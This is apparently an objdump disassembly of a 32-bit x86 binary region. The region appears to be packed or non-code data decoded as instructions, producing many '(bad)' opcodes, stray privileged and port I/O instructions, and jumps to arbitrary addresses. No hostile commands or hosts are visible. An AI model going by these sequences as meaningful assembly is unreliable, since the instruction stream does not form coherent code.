  4173d5:	add    BYTE PTR [ecx-0x44],ch
  4173d8:	xlat   BYTE PTR ds:[ebx]
  4173d9:	pop    esi
  4173da:	xlat   BYTE PTR ds:[ebx]
  4173db:	jg     0x4173c6
  4173dd:	mov    edi,0x6508016b
  4173e2:	ficomp DWORD PTR [edx]
  4173e4:	pop    edx
  4173e5:	xchg   ecx,eax
  4173e6:	addr16 cli 
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	push   ecx
  4173ef:	mov    esi,0x6e8d1b59
  4173f4:	mov    cl,0x37
  4173f6:	into   
  4173f7:	mov    sp,0xc643
  4173fb:	sahf   
  4173fc:	iret   
  4173fd:	cli    
  4173fe:	sub    cl,BYTE PTR [esi-0x257f187a]
  417404:	retf   
  417405:	dec    ebp
  417406:	cs and al,0x34
  417409:	jns    0x417402
  41740b:	adc    BYTE PTR [ecx],dh
  41740d:	test   al,0x74
  41740f:	(bad)  
  417410:	retf   
  417411:	popa   
  417412:	and    BYTE PTR [eax+0x1a38fcc8],bl
  417418:	popf   
  417419:	pop    esp
  41741a:	rcl    DWORD PTR [ecx-0x729d879],cl
  417420:	int3   
  417421:	jbe    0x417432
  417423:	cld    
  417424:	ja     0x417413
  417426:	in     eax,dx
  417427:	adc    DWORD PTR [edx],ebx
  417429:	repnz pop edx
  41742b:	jge    0x417445
  41742d:	adc    DWORD PTR [eax+0x477de225],0x9b2ab1be
  417437:	mov    ds:0xc96064f0,eax
  41743c:	cdq    
  41743d:	sbb    al,0x2e
  41743f:	xchg   ebx,eax
  417440:	push   esi
  417441:	dec    edx
  417442:	push   ds
  417443:	pop    ecx
  417444:	and    edx,DWORD PTR [eax-0x7915ded7]
  41744a:	sub    DWORD PTR [edi+0x43],eax
  41744d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41744e:	ins    DWORD PTR es:[edi],dx
  41744f:	pop    es
  417450:	inc    esi
  417451:	sub    BYTE PTR [ebp-0x11f84fb0],dh
  417457:	cmp    eax,0xd2e28f7
  41745c:	mov    ds:0x39868f6d,eax
  417461:	adc    BYTE PTR [ecx-0x5f],0xd
  417465:	mov    dl,0xe6
  417467:	cld    
  417468:	stos   BYTE PTR es:[edi],al
  417469:	ja     0x417483
  41746b:	push   ecx
  41746c:	jmp    0x37f4972d
  417471:	xchg   BYTE PTR [esi+0x42],bh
  417474:	(bad)  [ebx-0x2b]
  417477:	or     al,0x88
  417479:	xchg   ebx,eax
  41747a:	loope  0x41748e
  41747c:	out    0xe2,al
  41747e:	xor    ebp,DWORD PTR [esi+0x19]
  417481:	lods   eax,DWORD PTR ds:[esi]
  417482:	add    eax,0x651f941a
  417487:	dec    edx
  417488:	pusha  
  417489:	mov    ecx,DWORD PTR [edi-0x16186c13]
  41748f:	call   esi
  417491:	push   ss
  417492:	add    eax,0x21ae91e5
  417497:	inc    esi
  417498:	jno    0x417488
  41749a:	inc    esp
  41749b:	scas   al,BYTE PTR es:[edi]
  41749c:	bound  edi,QWORD PTR [ebp-0x2d]
  41749f:	fwait
  4174a0:	adc    eax,DWORD PTR [ebx]
  4174a2:	and    al,0x80
  4174a4:	shr    ebx,cl
  4174a6:	adc    edi,ebp
  4174a8:	mov    ch,0x39
  4174aa:	ss ss jnp 0x417475
  4174ae:	xor    DWORD PTR [ecx-0x7d],ebp
  4174b1:	inc    eax
  4174b2:	das    
  4174b3:	sbb    eax,0xf77caea5
  4174b8:	sti    
  4174b9:	sub    esi,0xffffffd5
  4174bc:	outs   dx,BYTE PTR ds:[esi]
  4174bd:	jae    0x417458
  4174bf:	xor    ebx,DWORD PTR [ecx]
  4174c1:	adc    DWORD PTR [ebx],edi
  4174c3:	sbb    al,0x3d
  4174c5:	icebp  
  4174c6:	lods   eax,DWORD PTR ds:[esi]
  4174c7:	jae    0x417518
  4174c9:	inc    ecx
  4174ca:	push   edi
  4174cb:	(bad)  
  4174cc:	sbb    al,0x4d
  4174ce:	leave  
  4174cf:	das    
  4174d0:	sub    eax,DWORD PTR [ecx-0x17c0d5d4]
  4174d6:	gs daa 
  4174d8:	leave  
  4174d9:	lock pusha 
  4174db:	pop    edx
  4174dc:	push   ss
  4174dd:	pop    edx
  4174de:	inc    ebp
  4174df:	pop    DWORD PTR [edi]
  4174e1:	lds    ecx,FWORD PTR [esp+0x66d73f47]
  4174e8:	lea    ecx,[ebx+0x20]
  4174eb:	sbb    al,0xd1
  4174ed:	icebp  
	...
  417556:	xchg   ecx,eax
  417557:	mov    edx,0xdc6b0c6a
  41755c:	idiv   DWORD PTR [edi+0x212a686b]
  417562:	pop    ecx
  417563:	push   ebp
  417564:	cs sahf 
  417566:	addr16 sti 
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	frstor ds:0x5d4c1b0c
  417574:	lock popf 
  417576:	xchg   esi,eax
  417577:	xchg   esi,eax
  417578:	cmc    
  417579:	nop
  41757a:	ret    0x13b5
  41757d:	adc    DWORD PTR [edx-0x502757b9],esi
  417583:	xchg   BYTE PTR [eax-0x5c],al
  417586:	fsub   QWORD PTR [eax]
  417588:	(bad)  
  41758a:	fwait
  41758b:	sahf   
  41758c:	pop    ebx
  41758d:	and    DWORD PTR [esi-0x403841f3],edi
  417593:	pusha  
  417594:	mov    ebx,0xd62cd485
  417599:	dec    ecx
  41759a:	imul   edi,DWORD PTR [esi-0x56],0xc011f86e
  4175a1:	enter  0x3d78,0x21
  4175a5:	xor    BYTE PTR [eax-0x12],0xa9
  4175a9:	pusha  
  4175aa:	sbb    al,0xbf
  4175ac:	leave  
  4175ad:	int3   
  4175ae:	push   es
  4175af:	retf   0x9dde
  4175b2:	leave  
  4175b3:	mov    edx,0xe5c355a1
  4175b8:	fucom  st(1)
  4175ba:	test   ebx,0x5d626286
  4175c0:	add    al,0x2b
  4175c2:	imul   edi,DWORD PTR [esi-0x6b],0x118a955a
  4175c9:	jmp    0xf87f:0x11442e5f
  4175d0:	xor    esp,DWORD PTR [edi+0x4d694a17]
  4175d6:	sub    BYTE PTR [esi],al
  4175d8:	popf   
  4175d9:	xor    dh,BYTE PTR [esi+0xb851492]
  4175df:	call   0x667d:0x46a470be
  4175e6:	xor    eax,0xff7de05c
  4175eb:	mov    eax,ds:0x7a5c52f
  4175f0:	out    dx,al
  4175f1:	cs xor al,0xd0
  4175f4:	push   esp
  4175f6:	out    dx,eax
  4175f7:	mov    esi,0xceb12d
  4175fc:	in     eax,0x81
  4175fe:	pop    ss
  4175ff:	dec    BYTE PTR [edx+0x7988fab4]
  417605:	sbb    al,0xa5
  417607:	lds    esp,FWORD PTR ds:0xc8fd245c
  41760d:	adc    DWORD PTR [esi-0x71],edi
  417610:	hlt    
  417611:	or     ebx,0x0
  417614:	sub    BYTE PTR [ebp+0xffdc3f1],bh
  41761a:	std    
  41761b:	push   edx
  41761c:	arpl   WORD PTR [esi-0x21253160],di
  417622:	cmp    al,0x8
  417624:	arpl   WORD PTR [edi+0x74576feb],bx
  41762a:	fcom   st(3)
  41762c:	scas   al,BYTE PTR es:[edi]
  41762d:	add    DWORD PTR [esi-0x4b1adafe],0x6e
  417634:	dec    esi
  417635:	jmp    0x2c12dc96
  41763a:	ds test eax,0xf6478a8c
  417640:	mov    al,0xd5
  417642:	(bad)  
  417644:	adc    eax,0x49676f24
  417649:	or     esp,DWORD PTR [edx+esi*1]
  41764c:	mov    DWORD PTR [edi+ecx*8-0x49b798],ebx
  417653:	fistp  QWORD PTR [edx]
  417655:	inc    ecx
  417656:	jne    0x41768b
  417658:	cmp    bl,BYTE PTR [esi-0x42]
  41765b:	mov    esi,0x7040d06f
  417660:	test   al,0x16
  417662:	sub    bl,bl
  417664:	popf   
  417665:	push   ss
  417666:	jg     0x417678
  417668:	fst    DWORD PTR ds:[ecx-0x51]
  41766c:	test   BYTE PTR [ebx],bl
	...
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	ficom  DWORD PTR [eax-0x37]
  4176e4:	add    dh,BYTE PTR [edi+0xfc67]
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	or     BYTE PTR [edi-0x5c],ah
  4176f1:	dec    eax
  4176f2:	mov    al,ds:0xbbdbdc89
  4176f7:	dec    eax
  4176f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176f9:	cld    
  4176fa:	lock mov bl,BYTE PTR [esi-0x7d01d31d]
  417701:	les    esi,FWORD PTR [ecx-0x47]
  417704:	jmp    DWORD PTR [ebx+eax*2+0x24414fdb]
  41770b:	push   edi
  41770c:	or     al,BYTE PTR [ecx+0x4440fd00]
  417712:	xor    DWORD PTR [ebx+edx*4-0x6c27cc10],0xffffffc3
  41771a:	enter  0x3f22,0x30
  41771e:	outs   dx,BYTE PTR ds:[esi]
  41771f:	jecxz  0x417746
  417721:	arpl   si,di
  417723:	nop
  417724:	or     dl,bl
  417726:	pop    eax
  417727:	xchg   edx,eax
  417728:	jecxz  0x417734
  41772a:	sets   cl
  41772d:	push   ss
  41772e:	xor    eax,0xb2eefcd3
  417733:	out    dx,eax
  417734:	fsub   QWORD PTR [ecx+0x6c]
  417737:	dec    edi
  417738:	repz mov esp,cs
  41773b:	xlat   BYTE PTR ds:[ebx]
  41773c:	js     0x41778c
  41773e:	pop    DWORD PTR [esi+0x945ea62]
  417744:	div    DWORD PTR [edx+0x5e]
  417747:	fdivr  DWORD PTR [edx-0x46]
  41774a:	mov    eax,0x1212327b
  41774f:	test   al,0xb9
  417751:	(bad)
  417755:	addr16 mov ch,0xa9
  417758:	rol    dl,0x77
  41775b:	cmp    al,0x27
  41775d:	es out 0x59,eax
  417760:	xor    al,0xf8
  417762:	loope  0x417708
  417764:	adc    esi,eax
  417766:	jle    0x4177c7
  417768:	inc    edi
  417769:	lock lods eax,DWORD PTR ds:[esi]
  41776b:	test   eax,0x7eae3083
  417770:	stos   BYTE PTR es:[edi],al
  417771:	sbb    al,0x1d
  417773:	jns    0x41777b
  417775:	or     al,0xcc
  417777:	adc    BYTE PTR [esi+eax*4+0x3d0db976],ch
  41777e:	fbld   TBYTE PTR [edi+0xe2203cc]
  417784:	mov    ds:0x3525d90c,al
  417789:	dec    edi
  41778a:	shr    BYTE PTR [ebx+0x53e769d0],cl
  417790:	jae    0x4177f2
  417792:	lea    ecx,[esi]
  417794:	adc    eax,0x7af7db68
  417799:	dec    ecx
  41779a:	jne    0x4177f1
  41779c:	xor    eax,0x94642614
  4177a1:	out    0x5b,eax
  4177a3:	inc    esi
  4177a4:	rol    cl,0xe8
  4177a7:	inc    edx
  4177a8:	xchg   edx,eax
  4177a9:	push   edx
  4177aa:	push   ss
  4177ab:	cmp    esi,eax
  4177ad:	jb     0x417754
  4177af:	sub    al,0x50
  4177b1:	mov    ebx,0xf9f225bb
  4177b6:	arpl   WORD PTR [ecx+eiz*4-0x28],bp
  4177ba:	(bad)  
  4177bb:	int3   
  4177bc:	push   0xffffff84
  4177be:	mov    edx,0x36d8bfb4
  4177c3:	pop    edx
  4177c4:	dec    edi
  4177c5:	(bad)  
  4177c6:	pop    eax
  4177c7:	jns    0x41777d
  4177c9:	xor    ch,ch
  4177cb:	test   bh,0x4f
  4177ce:	and    esi,DWORD PTR [ebx+0xfac3f42]
  4177d4:	in     al,dx
  4177d5:	jae    0x4177ae
  4177d7:	fisub  WORD PTR [eax-0x5a]
  4177da:	mov    esp,0x6b3f4ca0
  4177df:	and    BYTE PTR [ebx-0x23],0xf
  4177e3:	dec    esp
  4177e4:	mov    ?,WORD PTR [eax+0x1acb2bc2]
  4177ea:	retf   0x90de
  4177ed:	add    eax,DWORD PTR [eax]
	...
  417853:	add    BYTE PTR [eax],al
  417855:	add    cl,ch
  417857:	push   cs
  417858:	(bad)  
  417859:	pop    ss
  41785a:	push   edi
  41785c:	jmp    0x2334185f
  417861:	shr    al,cl
  417863:	adc    BYTE PTR [eax+0xfd6703],0x0
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	test   DWORD PTR [esi+0x23],edi
  417871:	test   ch,al
  417873:	retf   
  417874:	adc    ah,BYTE PTR [ecx-0x2b]
  417877:	jno    0x41789d
  417879:	out    dx,eax
  41787a:	xor    eax,0xc70cd226
  41787f:	cld    
  417880:	and    eax,0x18b9c6d8
  417885:	daa    
  417886:	(bad)  
  417888:	push   0x35a4ce85
  41788d:	or     DWORD PTR [edi-0x202d7e6e],edx
  417893:	push   ds
  417894:	call   0x1581:0x68cc7591
  41789b:	jne    0x41789e
  41789d:	jmp    0x41789a
  41789f:	xchg   esp,eax
  4178a0:	mov    ch,0x7a
  4178a2:	push   ecx
  4178a3:	inc    eax
  4178a4:	inc    ebp
  4178a5:	fmul   st,st(6)
  4178a7:	mov    ?,WORD PTR [eax-0x9]
  4178aa:	or     BYTE PTR [esi+ebx*1],0xed
  4178ae:	mov    ah,bh
  4178b0:	xor    BYTE PTR [edi+0x64],ch
  4178b3:	jecxz  0x4178e0
  4178b5:	mov    bh,0xaa
  4178b7:	test   eax,0xc41701fa
  4178bc:	mov    esp,0xaf493774
  4178c1:	add    DWORD PTR [edi-0x73faf95c],esp
  4178c7:	mov    esp,0xda3af460
  4178cc:	xor    al,0x18
  4178cf:	adc    al,0x4
  4178d1:	fcom   DWORD PTR es:[edi]
  4178d4:	sbb    al,0x1b
  4178d6:	push   ecx
  4178d7:	outs   dx,BYTE PTR ds:[esi]
  4178d8:	pop    ebp
  4178d9:	mov    dh,0x34
  4178db:	test   eax,0xc99fd15e
  4178e0:	pusha  
  4178e1:	mul    BYTE PTR [edx]
  4178e3:	push   0xee044f39
  4178e8:	jns    0x417923
  4178ea:	push   edi
  4178eb:	popf   
  4178ec:	or     BYTE PTR [edi],bl
  4178ee:	(bad)  
  4178ef:	out    dx,eax
  4178f0:	sub    cl,BYTE PTR [edx+0x13796a49]
  4178f6:	scas   eax,DWORD PTR es:[edi]
  4178f7:	push   ebx
  4178f8:	rcl    DWORD PTR [ebx],0x2d
  4178fb:	xchg   BYTE PTR [ebx],bh
  4178fd:	pop    edi
  4178fe:	adc    DWORD PTR fs:[ecx-0x34],edi
  417902:	mov    ds,WORD PTR [edi+0x524328f2]
  417908:	(bad)  
  41790a:	push   ecx
  41790b:	es cdq 
  41790d:	out    0x2c,al
  41790f:	je     0x4178c8
  417911:	in     al,dx
  417912:	push   ss
  417913:	mov    ecx,0xf66e94cc
  417918:	and    DWORD PTR [esi+0x2c],0x55
  41791c:	push   edx
  41791d:	je     0x41792f
  41791f:	(bad)  
  417920:	scas   al,BYTE PTR es:[edi]
  417921:	push   cs
  417922:	sbb    DWORD PTR [ebp+ebp*8-0x4f],edi
  417926:	sub    bl,BYTE PTR [ebx]
  417928:	sbb    al,0x22
  41792b:	les    edi,FWORD PTR [eax]
  41792d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41792e:	adc    DWORD PTR [edx-0x7b2f255c],edx
  417934:	out    0xd9,al
  417936:	pop    es
  417937:	adc    eax,0xe58b3ad8
  41793c:	cli    
  41793d:	icebp  
  41793e:	push   ebp
  41793f:	les    di,DWORD PTR cs:[ebx-0x6d]
  417944:	(bad)  
  417945:	iret   
  417946:	jnp    0x417979
  417948:	fisttp WORD PTR [esp+eiz*4-0x17739c1b]
  41794f:	out    0x3d,eax
  417951:	sbb    eax,0x46a14ad3
  417956:	in     al,0xde
  417958:	mov    al,0x9e
  41795a:	test   BYTE PTR [edi+0x2869f3f2],bl
  417960:	or     esi,DWORD PTR [edi+0x34cdb39c]
  417966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417967:	xchg   esi,eax
  417968:	cli    
  417969:	dec    esp
  41796a:	add    ebp,DWORD PTR [edx]
  41796c:	out    dx,al
  41796d:	jbe    0x41796f
	...
  4179d3:	add    BYTE PTR [eax],al
  4179d5:	add    BYTE PTR [eax+0x41],bl
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	js     0x417a3f
  4179e4:	pop    ebx
  4179e5:	int3   
  4179e6:	inc    BYTE PTR [bx+si]
  4179e9:	add    BYTE PTR [eax],al
  4179eb:	add    DWORD PTR [eax],eax
  4179ed:	add    BYTE PTR [esi+eiz*8+0x30b33cf8],cl
  4179f4:	dec    esp
  4179f5:	ror    DWORD PTR [ebx-0x35e6e7c6],1
  4179fb:	lods   eax,DWORD PTR ds:[esi]
  4179fc:	(bad)  
  4179fd:	pop    edx
  4179fe:	in     eax,0x46
  417a00:	std    
  417a01:	mov    al,0x4b
  417a03:	dec    esi
  417a04:	cs or  eax,0xe7612b3d
  417a0a:	sbb    cl,BYTE PTR [eax]
  417a0c:	pop    ecx
  417a0d:	or     eax,DWORD PTR [eax+0x13]
  417a10:	cld    
  417a11:	or     ebp,DWORD PTR [ebx+eax*4]
  417a14:	xor    BYTE PTR [eax+edx*1],bl
  417a17:	mov    ebp,0xcfe0782
  417a1c:	sub    al,0x3e
  417a1e:	(bad)  
  417a20:	imul   ebp,DWORD PTR ds:0x50d7adcd,0x33
  417a27:	icebp  
  417a28:	call   0xd55827fa
  417a2d:	ficomp WORD PTR [ebx-0x75]
  417a30:	xchg   DWORD PTR [ebp-0x7d],esi
  417a33:	xchg   ebx,eax
  417a34:	mov    al,0x92
  417a36:	push   esp
  417a37:	mov    eax,ds:0xcdd44570
  417a3c:	dec    edi
  417a3d:	sub    cl,BYTE PTR [ebx+0x5baf4474]
  417a43:	stc    
  417a44:	adc    BYTE PTR [ebp+0x33cd193d],ch
  417a4a:	popf   
  417a4b:	das    
  417a4c:	cmp    edi,esp
  417a4e:	sbb    DWORD PTR [eax-0x38110654],esp
  417a54:	or     DWORD PTR [ebp+0x1e4007e2],edx
  417a5a:	dec    ebx
  417a5b:	imul   esp,DWORD PTR [esi+esi*1-0x715c17d9],0x67
  417a63:	mov    bl,0x59
  417a65:	(bad)  
  417a66:	dec    eax
  417a67:	adc    BYTE PTR [ecx-0x1fb3abe],cl
  417a6d:	into   
  417a6e:	cmp    DWORD PTR [ecx-0x36],ecx
  417a71:	ret    
  417a72:	mov    ebp,DWORD PTR [ebx+0xa09ccb5]
  417a78:	(bad)  
  417a79:	mov    eax,0xa15f528b
  417a7e:	fisub  DWORD PTR [ebx-0x3f]
  417a81:	inc    esi
  417a82:	inc    esp
  417a83:	xor    bh,BYTE PTR [ebp-0x4b]
  417a86:	push   esp
  417a87:	retf   
  417a88:	push   edi
  417a89:	pushf  
  417a8a:	mov    cl,0x39
  417a8c:	into   
  417a8d:	or     DWORD PTR [edx+0x7262ff9e],esi
  417a93:	(bad)  
  417a94:	out    0xa9,al
  417a96:	outs   dx,BYTE PTR ds:[esi]
  417a97:	in     eax,0x70
  417a99:	call   0x1e55:0xece4ed3a
  417aa0:	(bad)  
  417aa1:	out    dx,eax
  417aa2:	jb     0x417aab
  417aa4:	dec    BYTE PTR [esi-0x2d]
  417aa7:	ins    BYTE PTR es:[edi],dx
  417aa8:	xchg   esi,eax
  417aa9:	fwait
  417aaa:	add    ch,BYTE PTR [edx+0x2e2a2159]
  417ab0:	pop    edi
  417ab1:	inc    BYTE PTR [eax]
  417ab3:	test   DWORD PTR [eax+eiz*4-0x2e],0x57b3e0f1
  417abb:	pusha  
  417abc:	add    dl,BYTE PTR [ebp+0x4c]
  417abf:	out    dx,eax
  417ac0:	mov    WORD PTR [edi-0x9fef6d9],gs
  417ac6:	xor    al,0x66
  417ac8:	add    ebp,DWORD PTR [edi-0x45e4c82e]
  417ace:	lods   al,BYTE PTR ds:[esi]
  417acf:	ins    BYTE PTR es:[edi],dx
  417ad0:	mov    DWORD PTR [edx],ebx
  417ad2:	cmp    ch,0x7
  417ad5:	scas   al,BYTE PTR es:[edi]
  417ad6:	(bad)  
  417ad7:	int    0xb6
  417ad9:	push   ecx
  417ada:	mov    al,0xa3
  417adc:	sti    
  417add:	pop    ebx
  417ade:	jle    0x417aa5
  417ae0:	inc    eax
  417ae1:	xchg   edx,eax
  417ae2:	and    ah,BYTE PTR [eax+0x37]
  417ae5:	adc    eax,0x8e91b72f
  417aea:	mov    edx,0xb37ba1
	...
  417b53:	add    BYTE PTR [eax],al
  417b55:	add    BYTE PTR [edi],ch
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx+0x70083b5b]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    BYTE PTR [eax+0x13],bh
  417b70:	inc    esp
  417b71:	mov    edi,0xd29b093c
  417b76:	push   ss
  417b77:	xchg   esi,eax
  417b78:	lahf   
  417b79:	dec    ebx
  417b7a:	adc    al,0x26
  417b7c:	push   ds
  417b7d:	push   cs
  417b7e:	mov    ah,0x1d
  417b80:	int    0xd6
  417b82:	aad    0xa3
  417b84:	sbb    dl,0x48
  417b87:	scas   eax,DWORD PTR es:[edi]
  417b88:	push   eax
  417b89:	lock ror bh,1
  417b8c:	lea    esi,[edx+0x1]
  417b8f:	xor    bl,ch
  417b91:	into   
  417b92:	inc    ebx
  417b93:	test   eax,0xf4ff4e10
  417b98:	frstor [ebp+ebp*2-0x29]
  417b9c:	jae    0x417bf9
  417b9e:	pusha  
  417b9f:	rcl    DWORD PTR [edi+edi*4+0x55],cl
  417ba3:	(bad)  [edi+0x4b]
  417ba6:	push   0xffffffa1
  417ba8:	out    dx,eax
  417ba9:	dec    eax
  417baa:	aaa    
  417bab:	retf   0xc5b1
  417bae:	(bad)  
  417bb0:	outs   dx,DWORD PTR ds:[esi]
  417bb1:	fs adc eax,0x1916e9b9
  417bb7:	jge    0x417bcc
  417bb9:	(bad)  
  417bba:	out    0x37,eax
  417bbc:	dec    ebx
  417bbd:	and    al,0xbc
  417bc0:	mov    ebp,DWORD PTR [esi]
  417bc2:	add    eax,edx
  417bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bc5:	add    al,0x14
  417bc7:	push   0x2b
  417bc9:	inc    esp
  417bca:	push   ebp
  417bcb:	js     0x417be7
  417bcd:	sub    bh,bh
  417bcf:	into   
  417bd0:	and    eax,0x1780a19c
  417bd5:	xor    al,0x8a
  417bd7:	ja     0x417c49
  417bd9:	or     ebx,DWORD PTR [ebx-0x5c955f81]
  417bdf:	sub    esi,DWORD PTR [eax]
  417be1:	scas   eax,DWORD PTR es:[edi]
  417be2:	mov    ds:0x193c5e44,eax
  417be7:	enter  0x7ba5,0xae
  417beb:	loop   0x417b98
  417bed:	xchg   esi,eax
  417bee:	mov    al,ds:0x133c9f18
  417bf3:	js     0x417c6a
  417bf5:	sar    BYTE PTR [edx],0xd9
  417bf8:	in     eax,dx
  417bf9:	sar    BYTE PTR [edi],cl
  417bfb:	adc    bl,al
  417bfd:	cmp    BYTE PTR [ebx+0x221d9d2d],ah
  417c03:	nop
  417c04:	lods   al,BYTE PTR ds:[esi]
  417c05:	xchg   ebp,eax
  417c06:	daa    
  417c07:	mov    bh,0x8e
  417c09:	js     0x417b92
  417c0b:	leave  
  417c0c:	mov    eax,edi
  417c0e:	aas    
  417c0f:	loop   0x417c2d
  417c11:	shl    DWORD PTR [eax+0x54a14137],1
  417c17:	(bad)  
  417c18:	push   0xcc9c268e
  417c1d:	call   0x4d00:0x69b5a2c3
  417c24:	dec    eax
  417c25:	fyl2xp1 
  417c27:	in     eax,dx
  417c28:	ja     0x417c4d
  417c2a:	add    eax,edi
  417c2c:	iret   
  417c2d:	(bad)
  417c30:	cmp    DWORD PTR [edx+edx*4],edx
  417c33:	mov    ebx,0xce785c31
  417c38:	dec    ecx
  417c39:	or     BYTE PTR [edx+0x4f],cl
  417c3c:	pop    ss
  417c3d:	call   0xcb9bfabb
  417c42:	icebp  
  417c43:	pop    eax
  417c44:	mov    eax,0xf5c0f9f2
  417c49:	add    ah,ch
  417c4b:	sbb    DWORD PTR ds:0x374b5e38,esp
  417c51:	fild   WORD PTR [esi+0x6e488cc8]
  417c57:	dec    ebp
  417c58:	jmp    0x2ed64d3a
  417c5d:	(bad)  
  417c5e:	cmp    ebx,ecx
  417c60:	mov    WORD PTR [esi],es
  417c62:	int    0x1d
  417c64:	fs cli 
  417c66:	push   0xffffff90
  417c68:	arpl   WORD PTR [ebx],sp
  417c6a:	inc    esp
  417c6b:	bound  ecx,QWORD PTR [eax+0x22]
	...
  417cd5:	add    BYTE PTR [ecx-0x267b6f40],cl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x44
  417ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ce4:	lods   eax,DWORD PTR ds:[esi]
  417ce5:	mov    ebx,0x10067
  417cea:	add    BYTE PTR [ecx],al
  417cec:	add    BYTE PTR [eax],al
  417cee:	push   ds
  417cef:	pop    ds
  417cf0:	cld    
  417cf1:	imul   DWORD PTR [eax-0x7424902]
  417cf7:	mov    DWORD PTR [edx],esi
  417cf9:	out    dx,al
  417cfa:	(bad)  
  417cfc:	int3   
  417cfd:	add    al,0x62
  417cff:	int    0x1c
  417d01:	sub    dl,cl
  417d03:	xchg   DWORD PTR [edx+eiz*2],ebx
  417d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d07:	mov    edi,0x9cf22288
  417d0c:	xchg   ebx,eax
  417d0d:	neg    DWORD PTR [ecx+0x29543676]
  417d13:	jmp    0x8499c645
  417d18:	bnd ja 0x417d78
  417d1b:	aas    
  417d1c:	sub    dl,cl
  417d1e:	cli    
  417d1f:	in     eax,dx
  417d20:	mov    dh,0x94
  417d22:	sar    BYTE PTR [eax],0xaf
  417d25:	push   0x72
  417d27:	mov    ebx,0x5f7a382d
  417d2c:	or     ch,BYTE PTR [ecx+0x2c]
  417d2f:	hlt    
  417d30:	call   0x7143:0x50b9a1b5
  417d37:	nop
  417d38:	or     DWORD PTR [ecx+0x24],ecx
  417d3b:	sub    BYTE PTR [ebp+0x47333d8b],ch
  417d41:	pushf  
  417d42:	mov    ch,BYTE PTR [ebx]
  417d44:	xchg   ebx,eax
  417d45:	xchg   esi,eax
  417d46:	dec    esi
  417d47:	mov    BYTE PTR [edi-0x57],0x10
  417d4b:	cs retf 
  417d4d:	cwde   
  417d4e:	add    BYTE PTR [edx],0x2a
  417d51:	xor    al,0xf7
  417d53:	mov    bh,ch
  417d55:	sbb    dl,cl
  417d57:	jb     0x417ce9
  417d59:	xchg   esp,eax
  417d5a:	loopne 0x417d60
  417d5c:	xchg   ecx,esi
  417d5e:	mov    eax,ds:0xd5b6f6d3
  417d63:	or     ch,BYTE PTR [edx-0x5379f1bd]
  417d69:	ret    
  417d6a:	addr16 (bad) 
  417d6c:	out    dx,al
  417d6d:	out    dx,al
  417d6e:	push   ss
  417d6f:	repz imul ecx,eax,0x126a43a5
  417d76:	leave  
  417d77:	(bad)  
  417d79:	mov    es,WORD PTR [ecx+edx*2]
  417d7c:	cmp    al,dl
  417d7e:	xchg   ebp,eax
  417d7f:	popa   
  417d80:	mov    esp,0x6670c4da
  417d85:	and    bl,ch
  417d87:	push   ss
  417d88:	pop    eax
  417d89:	dec    ecx
  417d8a:	xor    esi,DWORD PTR [esi-0x5e]
  417d8d:	das    
  417d8e:	xchg   esi,eax
  417d8f:	nop
  417d90:	in     eax,dx
  417d91:	jbe    0x417d14
  417d93:	sbb    esp,esp
  417d95:	jns    0x417dc0
  417d97:	pushf  
  417d98:	sar    ecx,0xc7
  417d9b:	mov    BYTE PTR [eax+0x1e611774],dl
  417da1:	and    edi,DWORD PTR [edi-0x71]
  417da4:	jge    0x417d43
  417da6:	pop    edi
  417da7:	mov    ecx,0xbe456257
  417dac:	fcmovbe st,st(5)
  417dae:	pop    ss
  417daf:	sub    ah,BYTE PTR [edx+ecx*8]
  417db2:	pop    eax
  417db3:	mov    ebp,0x4676fccd
  417db8:	lds    ebp,FWORD PTR [eax+0x38]
  417dbb:	pop    es
  417dbc:	and    DWORD PTR [edi-0x34aa1def],ebp
  417dc2:	aam    0x7b
  417dc4:	jp     0x417de3
  417dc6:	mov    dh,0xf1
  417dc8:	retf   
  417dc9:	and    ecx,DWORD PTR [ecx+0x73]
  417dcc:	shr    DWORD PTR [esi+0x37c76ee1],cl
  417dd2:	(bad)  
  417dd3:	inc    ebp
  417dd4:	sub    eax,0x79cbfe0f
  417dd9:	mov    WORD PTR [edx-0x53],es
  417ddc:	mov    WORD PTR [edx-0x10df2508],cs
  417de2:	push   ebx
  417de3:	or     bl,dh
  417de5:	icebp  
  417de6:	in     eax,dx
  417de7:	jge    0x417d74
  417de9:	sub    esi,DWORD PTR [eax+0x4]
  417dec:	mov    eax,0x24
	...
  417e55:	add    BYTE PTR [edi],dl
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e63:	pop    ds
  417e64:	aam    0x2b
  417e66:	add    DWORD PTR [bx+di],eax
  417e69:	add    BYTE PTR [eax],al
  417e6b:	add    DWORD PTR [eax],eax
